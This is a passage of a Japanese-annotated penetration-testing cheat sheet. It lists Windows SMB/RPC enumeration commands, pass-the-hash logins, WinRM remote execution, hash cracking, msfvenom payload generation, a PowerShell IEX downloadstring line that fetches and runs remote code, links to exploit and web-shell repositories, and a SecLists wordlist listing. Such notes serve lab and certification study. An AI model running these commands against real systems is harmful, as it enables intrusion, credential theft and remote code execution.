# printer
net rpc printer list -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc printer driver -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# service
net rpc service list -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc service status 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc service start 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc service stop 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc service create 'SERVICENAME' 'DISPLAYNAME' 'BINARYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc service delete 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# regisgtry
net rpc registry enumerate 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry getvalue 'KEYPATH' 'VALUENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry createkey 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry deletekey 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry setvalue 'KEYPATH' 'VALUENAME' 'TYPE' 'VALUE' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry deletevalue 'KEYPATH' 'VALUENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry export 'KEYPATH' 'LOCALPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc registry save 'KEYPATH' 'REMOTEPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# shell
net rpc shell -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc> info
net rpc> share list
net rpc> share info 'SHARE'
net rpc> user list
net rpc> user info 'USERNAME'
net rpc> user show 'USERNAME'
net rpc> user edit fullname 'USERNAME' 'FULLNAME'
net rpc> user edit disabled 'USERNAME' 'YES or NO'
net rpc> user edit autolock 'USERNAME' 'YES or NO'
net rpc> user edit pwnotreq 'USERNAME' 'YES or NO'
net rpc> user edit pwnoexp 'USERNAME' 'YES or NO'
net rpc> user edit pwnoexp 'USERNAME' 'YES or NO'
net rpc> account show
net rpc> account badpw 'NUM'
net rpc> account resetduration 'NUM'
net rpc> account lockduration 'SECOND'
net rpc> account minpwage 'SECOND'
net rpc> account maxpwage 'SECOND'
net rpc> account minpwlen 'NUM'
net rpc> account pwhistlen 'NUM'
```
- rpcclient
```sh
# WINREG
rpcclient $> winreg_enumkey 'KEYPATH'
rpcclient $> winreg_enumval 'KEYPATH'
rpcclient $> querymultiplevalues 'KEYPATH' 'VALUENAME' 'VALUENAME' ...
# EVENTLOG
rpcclient $> eventlog_numrecord 'LOGNAME'
rpcclient $> eventlog_oldestrecord 'LOGNAME'
rpcclient $> eventlog_reportevent 'LOGNAME'
rpcclient $> eventlog_loginfo 'LOGNAME'
# DRSUAPI

# WKSSVC
rpcclient $> wkssvc_wkstagetinfo
rpcclient $> wkssvc_getjoininformation
rpcclient $> wkssvc_enumeratecomputernames
rpcclient $> wkssvc_enumerateusers
# DFS
rpcclient $> dfsversion
rpcclient $> dfsenum
# SRVSVC
rpcclient $> srvinfo
rpcclient $> netshareenum
rpcclient $> netshareenumall
rpcclient $> netsharegetinfo 'SHARENAME'
rpcclient $> netfileenum
rpcclient $> netsessenum
rpcclient $> netdiskenum
rpcclient $> netconnenum
# NETLOGON
rpcclient $> getanydcname 'DOMAIN'
rpcclient $> getdcname 'DOMAIN'
rpcclient $> dsr_getdcname 'DOMAIN'
rpcclient $> dsr_getsitename 'COMPUTERNAME'
rpcclient $> dsr_getforesttrustinfo
rpcclient $> logonctrl 'COMPUTERNAME'
rpcclient $> samlogon
rpcclient $> gettrustrid
rpcclient $> dsr_enumtrustdom
rpcclient $> dsenumdomtrusts
rpcclient $> netrenumtrusteddomains
rpcclient $> getdcsitecoverage 'COMPUTERNAME'
rpcclient $> capabilities
rpcclient $> logongetdomaininfo
# SAMR
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumalsgroups builtin
rpcclient $> enumalsgroups domain
rpcclient $> enumdomains
rpcclient $> querydispinfo
rpcclient $> querydominfo
rpcclient $> queryuser 'RID'
rpcclient $> queryusergroups 'RID'
rpcclient $> queryuseraliases builtin 'SID'
rpcclient $> queryuseraliases domain 'SID'
rpcclient $> querygroup 'RID'
rpcclient $> querygroupmem 'RID'
rpcclient $> queryaliasmem builtin 'RID'
rpcclient $> queryaliasmem domain 'RID'
rpcclient $> samlookupnames builtin 'GROUPNAME'
rpcclient $> samlookupnames domain 'GROUPNAME'
rpcclient $> samlookuprids builtin 'RID'
rpcclient $> samlookuprids domain 'RID'
rpcclient $> samquerysecobj
rpcclient $> lookupdomain 'DOMAIN'
rpcclient $> getusrdompwinfo 'RID'
rpcclient $> getdompwinfo
rpcclient $> createdomuser 'USERNAME'
rpcclient $> deletedomuser 'USERNAME'
rpcclient $> createdomgroup 'GROUPNAME'
rpcclient $> deletedomgroup 'GROUPNAME'
rpcclient $> createdomalias 'GROUPNAME'
rpcclient $> deletealias domain 'RID'
# LSARPC-DS
rpcclient $> dsroledominfo
# LSARPC
rpcclient $> lsaquery
rpcclient $> lookupsids 'SID'
rpcclient $> lookupsids_level 1 'SID'
rpcclient $> lookupnames 'NAME'
rpcclient $> lookupnames_level 1 'NAME'
rpcclient $> lsaenumsid
rpcclient $> lsaquerysecobj
rpcclient $> enumprivs
rpcclient $> enumtrust
rpcclient $> lsalookupprivvalue 'PRIVILEGE NAME'
rpcclient $> lsaenumprivsaccount 'SID'
rpcclient $> lsaenumacctrights 'SID'
rpcclient $> lsaaddpriv 'SID' 'PRIVILEGE NAME'
rpcclient $> lsadelpriv 'SID' 'PRIVILEGE NAME'
rpcclient $> lsaaddacctrights 'SID' 'PRIVILEGE NAME'
rpcclient $> lsaremoveacctrights 'SID' 'PRIVILEGE NAME'
rpcclient $> lsacreateaccount 'SID'
rpcclient $> getusername
# EPMAPPER
rpcclient $> epmmap
rpcclient $> epmlookup
```
- smbclient
```sh
smbclient -L 'IP' -N  
smbclient -L 'IP' -U 'DOMAIN/USERNAME%PASSWORD'
smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//IP/SHARE'
```
- smbmap
```sh
smbmap -H 'IP' -u ' ' -p ''  --no-banner
smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' --no-banner
smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH'  --no-banner
```
- CVE
  - eternalblue
    ```sh
    nmap -n -Pn -p445 --script=smb-vuln-ms17-010 'IP'
    ```
  - [CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)
  - [ms08-067](https://github.com/andyacer/ms08_067)
    ```sh
    nmap -n -Pn -p445 --script=smb-vuln-ms08-067 'IP'
    ```


## 5060 (UDP)
- svwar
```sh
svwar -t 'Duration' -e 'EXTENSION RANGE' -m INVITE 'IP'
```


## 5985
- evil-winrm
```sh
evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
```
- netexec
```sh
netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
```


## Kali
- 2to3-2.7
```sh
2to3-2.7 --no-diffs -w 'FILENAME'
```
- exiftool
```sh
exiftool 'FILENAME'
```
- gpp-decrypt
```sh
# MS14-025
gpp-decrypt "Groups.xmlのcpassword"
```
- hashcat
```sh
hashcat -a 0 -m 'NUM' 'INPUT.txt' /usr/share/wordlists/rockyou.txt --quiet
```
- impacket-smbserver
```sh
impacket-smbserver 'SHARENAME' 'PATH'
# smbv1が無効の場合は
impacket-smbserver -smb2support 'SHARENAME' 'PATH'
```
- john
```sh
keepass2john passcodes.kdbx > 'OUTPUT.txt'
ssh2john 'PRIVATEKEY' > 'OUTPUT.txt'

john --wordlist=/usr/share/wordlists/rockyou.txt --format='FORMAT' 'HASH'
```
- msfvenom
```sh
msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o 'OUTPUT'
```
- name-that-hash
```sh
name-that-hash -f 'hash.txt' --no-banner --no-john
```
- openssl
```sh
openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
```
- phpbash  
[phpbash](https://github.com/Arrexel/phpbash)
- pspy
```sh
./pspy64
```
- puttygen
```sh
puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
```
- username-anarchy
```sh
./username-anarchy -i userlist.txt > user.txt
```


## windows
- AdSyncDecrypt  
[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
- cmd
```bat
# execute 64bit process on 32bit process
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
```
- powershell  
  [nishang](https://github.com/samratashok/nishang)
```powershell
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
```
- winpeas
```bat
# 32bit or 64bit のバージョンに注意
.\winPEASx64.exe userinfo quiet
```
### exploit
#### windows
- [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)
- [CVE-2009-0079](https://github.com/Re4son/Churrasco/)
- [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)
- [MS16-032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)
- https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-exploits.md
- `https://github.com/abatchy17/WindowsExploits`
- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/rasta-mouse/Sherlock
- https://kakyouim.hatenablog.com/entry/2020/05/27/010807
#### other
- [CVE-2023-32784](https://github.com/z-jxy/keepass_dump)
- [PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) - Ruby / YAML.load()


## link
- https://book.hacktricks.wiki/en/index.html
- https://cwe.mitre.org/data/published/cwe_latest.pdf
- https://exploit-notes.hdks.org/
- https://github.com/swisskyrepo/InternalAllTheThings
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://gtfobins.github.io/
- https://hideandsec.sh/books
- https://infra.newerasec.com/
- https://juggernaut-sec.com/
- https://kashz.gitbook.io/kashz-jewels
- https://morgan-bin-bash.gitbook.io/pentesting/
- https://www.hackingarticles.in/
- https://www.thehacker.recipes/
- https://www.revshells.com/
- a
- https://github.com/kavika13/RemCom
- https://www.hyhforever.top/



## list
https://github.com/netbiosX/Default-Credentials
### seclists
<details>
<summary>クリック</summary>
  
 ```sh
└─$ find /usr/share/seclists/Discovery -type f -exec wc -l {} +  
    64770 /usr/share/seclists/Discovery/Infrastructure/All-Ipv4-ClassC-192.168.txt
    65535 /usr/share/seclists/Discovery/Infrastructure/Ports-1-To-65535.txt
       36 /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt
       51 /usr/share/seclists/Discovery/Infrastructure/common-router-ips.txt
       21 /usr/share/seclists/Discovery/Infrastructure/IPGenerator.sh
        1 /usr/share/seclists/Discovery/Infrastructure/nmap-ports-top1000.txt
    64770 /usr/share/seclists/Discovery/Infrastructure/All-Ipv4-ClassA-10.10.txt
       70 /usr/share/seclists/Discovery/File-System/OBEX_common.txt
       31 /usr/share/seclists/Discovery/File-System/OBEX_rare.txt
   151265 /usr/share/seclists/Discovery/DNS/namelist.txt
   653920 /usr/share/seclists/Discovery/DNS/combined_subdomains.txt
  4850604 /usr/share/seclists/Discovery/DNS/FUZZSUBS_CYFARE_2.txt
     5370 /usr/share/seclists/Discovery/DNS/subdomains-spanish.txt
  3000001 /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
     2280 /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
    19966 /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
   100000 /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
       12 /usr/share/seclists/Discovery/DNS/README.md
     1419 /usr/share/seclists/Discovery/DNS/services-names.txt
      500 /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top500.txt
    64721 /usr/share/seclists/Discovery/DNS/shubs-stackoverflow.txt
   114442 /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
     4989 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  2171687 /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
     3430 /usr/share/seclists/Discovery/DNS/tlds.txt
    20000 /usr/share/seclists/Discovery/DNS/italian-subdomains.txt
   484699 /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
    49928 /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt
   102582 /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt
  5605156 /usr/share/seclists/Discovery/DNS/FUZZSUBS_CYFARE_1.txt
  1613291 /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt
    81643 /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
       15 /usr/share/seclists/Discovery/Web-Content/sap-analytics-cloud.txt
      828 /usr/share/seclists/Discovery/Web-Content/CMS/drupal-themes.fuzz.txt
      305 /usr/share/seclists/Discovery/Web-Content/CMS/symfony-315-demo.txt
      892 /usr/share/seclists/Discovery/Web-Content/CMS/flyspray-1.0RC4.txt
       16 /usr/share/seclists/Discovery/Web-Content/CMS/sitecore
      731 /usr/share/seclists/Discovery/Web-Content/CMS/modx-revolution-plugins
        5 /usr/share/seclists/Discovery/Web-Content/CMS/shopware.txt
      591 /usr/share/seclists/Discovery/Web-Content/CMS/Adobe-AEM_2021.txt
       61 /usr/share/seclists/Discovery/Web-Content/CMS/liferay_dxp_default_portlets.txt
      203 /usr/share/seclists/Discovery/Web-Content/CMS/ColdFusion.fuzz.txt
     2217 /usr/share/seclists/Discovery/Web-Content/CMS/Umbraco.fuzz.txt
     1520 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/opensourcepos.txt
     3763 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/fatfreecrm-all-levels.txt
    57634 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/opencart-all-levels.txt
    18745 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/forkcms-all-levels.txt
     3111 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/modx.txt
     8849 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/espocrm.txt
    15026 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/modx-all-levels.txt
    14032 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/dolibarr.txt
    19662 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/statamic-all-levels.txt
    40179 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/magento.txt
    12964 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/woocommerce.txt
    21426 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/shopware.txt
     2069 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/bolt.txt
   331709 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/magento-all-levels.txt
     1537 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/django-cms.txt
    11122 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/zammad.txt
     7121 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/suitecrm.txt
     7218 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/django-cms-all-levels.txt
    11018 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/sylius.txt
    31705 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/nopcommerce-all-levels.txt
    13365 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/phpbb-all-levels.txt
    91957 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/woocommerce-all-levels.txt
    37832 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/snipe-it-all-levels.txt
    86999 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/umbraco-cms-all-levels.txt
     4391 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/craftcms.txt
    26970 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/tomcat-all-levels.txt
     4316 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/erpnext.txt
    10829 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/bolt-all-levels.txt
      114 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pyrocms.txt
     4901 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/nopcommerce.txt
   128372 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/drupal-all-levels.txt
    15866 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/flarum-all-levels.txt
     6200 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/crater-all-levels.txt
    34244 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/strapi-all-levels.txt
     2801 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/flarum.txt
     5610 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pagekit-all-levels.txt
    13556 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/umbraco-cms.txt
     4772 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/yetiforcecrm.txt
       29 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pico.txt
      999 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/fatfreecrm.txt
     7020 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/vanilla.txt
     4096 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/grav-all-levels.txt
    14343 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
     2588 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/bagisto.txt
       41 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/laravel.txt
    55089 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/espocrm-all-levels.txt
     6022 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/ghost.txt
    23689 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/yetiforcecrm-all-levels.txt
      649 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/octobercms.txt
    18574 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/bagisto-all-levels.txt
     7306 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/snipe-it.txt
     7723 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/opencart.txt
     5810 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/opensourcepos-all-levels.txt
      341 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pyrocms-all-levels.txt
   144780 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/shopware-all-levels.txt
     2871 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/octobercms-all-levels.txt
     1352 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/crater.txt
    34392 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/vanilla-all-levels.txt
    27487 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/joomla-all-levels.txt
    30669 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/suitecrm-all-levels.txt
     5466 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/mautic.txt
     2815 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/phpbb.txt
    31180 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/mautic-all-levels.txt
       86 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/laravel-all-levels.txt
       49 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pico-all-levels.txt
      709 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/grav.txt
     5358 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/joomla.txt
    12578 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/prestashop.txt
     3552 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/directus.txt
    20770 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/erpnext-all-levels.txt
     1010 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/pagekit.txt
     2535 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/forkcms.txt
      179 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/aimeos.txt
    80092 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/sylius-all-levels.txt
    75610 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/prestashop-all-levels.txt
      626 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/aimeos-all-levels.txt
     3205 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
    17513 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/directus-all-levels.txt
    64822 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/zammad-all-levels.txt
    18584 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/drupal.txt
     4567 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/tomcat.txt
     4910 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/strapi.txt
     4391 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/statamic.txt
    68440 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/dolibarr-all-levels.txt
    37246 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/ghost-all-levels.txt
    19662 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/craftcms-all-levels.txt
     1486 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/keystonejs.txt
     6264 /usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/keystonejs-all-levels.txt
       29 /usr/share/seclists/Discovery/Web-Content/CMS/README.md
     1706 /usr/share/seclists/Discovery/Web-Content/CMS/Sharepoint.txt
       16 /usr/share/seclists/Discovery/Web-Content/CMS/cms-configuration-files.txt
    16544 /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt
     2768 /usr/share/seclists/Discovery/Web-Content/CMS/dotnetnuke.txt
       30 /usr/share/seclists/Discovery/Web-Content/CMS/joomla-themes.fuzz.txt
     2142 /usr/share/seclists/Discovery/Web-Content/CMS/php-nuke.fuzz.txt
     1578 /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
     7433 /usr/share/seclists/Discovery/Web-Content/CMS/piwik-3.0.4.txt
       17 /usr/share/seclists/Discovery/Web-Content/CMS/SAP.fuzz.txt
     1083 /usr/share/seclists/Discovery/Web-Content/CMS/Oracle-EBS-wordlist.txt
      257 /usr/share/seclists/Discovery/Web-Content/CMS/AdobeCQ-AEM_2017.txt
     8796 /usr/share/seclists/Discovery/Web-Content/CMS/kentico-cms-modules-themes.txt
     1320 /usr/share/seclists/Discovery/Web-Content/CMS/caobox-cms.txt
     3646 /usr/share/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt
      485 /usr/share/seclists/Discovery/Web-Content/CMS/Sharepoint-Ennumeration.txt
    13370 /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
      159 /usr/share/seclists/Discovery/Web-Content/CMS/Sitefinity-fuzz.txt
       19 /usr/share/seclists/Discovery/Web-Content/CMS/SiteMinder.fuzz.txt
      770 /usr/share/seclists/Discovery/Web-Content/CMS/Umbraco.txt
    10947 /usr/share/seclists/Discovery/Web-Content/CMS/Django.txt
    58242 /usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt
      605 /usr/share/seclists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt
      224 /usr/share/seclists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt
    66885 /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt
        3 /usr/share/seclists/Discovery/Web-Content/SOAP-functions.txt
   220559 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
        3 /usr/share/seclists/Discovery/Web-Content/JavaServlets-Common.fuzz.txt
    63088 /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
       78 /usr/share/seclists/Discovery/Web-Content/tftp.fuzz.txt
        3 /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt
   128365 /usr/share/seclists/Discovery/Web-Content/combined_words.txt
    56162 /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
       22 /usr/share/seclists/Discovery/Web-Content/coldfusion.txt
    26583 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
       13 /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
    11424 /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
       16 /usr/share/seclists/Discovery/Web-Content/AdobeXML.fuzz.txt
    17769 /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
      591 /usr/share/seclists/Discovery/Web-Content/Public-Source-Repo-Issues.json
     1234 /usr/share/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt
     4746 /usr/share/seclists/Discovery/Web-Content/common.txt
      475 /usr/share/seclists/Discovery/Web-Content/domino-endpoints-coldfusion39.txt
    56293 /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
    35325 /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt
      216 /usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
     8533 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache.txt
      103 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache-Tomcat.txt
       70 /usr/share/seclists/Discovery/Web-Content/Web-Servers/README.md
       17 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache-Axis.txt
       35 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Oracle-Sun-iPlanet.txt
       41 /usr/share/seclists/Discovery/Web-Content/Web-Servers/nginx.txt
        0 /usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS-POST.txt
       13 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Java-Servlet-Runner-Adobe-JRun.txt
       19 /usr/share/seclists/Discovery/Web-Content/Web-Servers/JBoss.txt
       68 /usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS-systemweb.txt
       51 /usr/share/seclists/Discovery/Web-Content/Web-Servers/Glassfish-Sun-Microsystems.txt
       24 /usr/share/seclists/Discovery/Web-Content/JavaScript-Miners.txt
   119600 /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
    87018 /usr/share/seclists/Discovery/Web-Content/LinuxFileList.txt
     5070 /usr/share/seclists/Discovery/Web-Content/common-and-italian.txt
     2414 /usr/share/seclists/Discovery/Web-Content/uri-from-top-55-most-popular-apps.txt
       25 /usr/share/seclists/Discovery/Web-Content/rssfeed-files.txt
       30 /usr/share/seclists/Discovery/Web-Content/reverse-proxy-inconsistencies.txt
       86 /usr/share/seclists/Discovery/Web-Content/README.md
     2450 /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt
   107982 /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
       46 /usr/share/seclists/Discovery/Web-Content/Passwords.fuzz.txt
    21332 /usr/share/seclists/Discovery/Web-Content/dutch/list_6.txt
   152628 /usr/share/seclists/Discovery/Web-Content/dutch/my.txt
    70064 /usr/share/seclists/Discovery/Web-Content/dutch/github_2.txt
   204423 /usr/share/seclists/Discovery/Web-Content/dutch/final_with_underscore.txt
    20374 /usr/share/seclists/Discovery/Web-Content/dutch/list_4.txt
     5126 /usr/share/seclists/Discovery/Web-Content/dutch/lobbes_word.txt
    74925 /usr/share/seclists/Discovery/Web-Content/dutch/list_3.txt
   132181 /usr/share/seclists/Discovery/Web-Content/dutch/my_with_underscore.txt
    27679 /usr/share/seclists/Discovery/Web-Content/dutch/list_1.txt
   132181 /usr/share/seclists/Discovery/Web-Content/dutch/my_u.txt
     3057 /usr/share/seclists/Discovery/Web-Content/dutch/list_5.txt
   129244 /usr/share/seclists/Discovery/Web-Content/dutch/my_u_without_spaces.txt
   242487 /usr/share/seclists/Discovery/Web-Content/dutch/final.txt
   204424 /usr/share/seclists/Discovery/Web-Content/dutch/final_u.txt
    18149 /usr/share/seclists/Discovery/Web-Content/dutch/new/19.txt
     7899 /usr/share/seclists/Discovery/Web-Content/dutch/new/30.txt
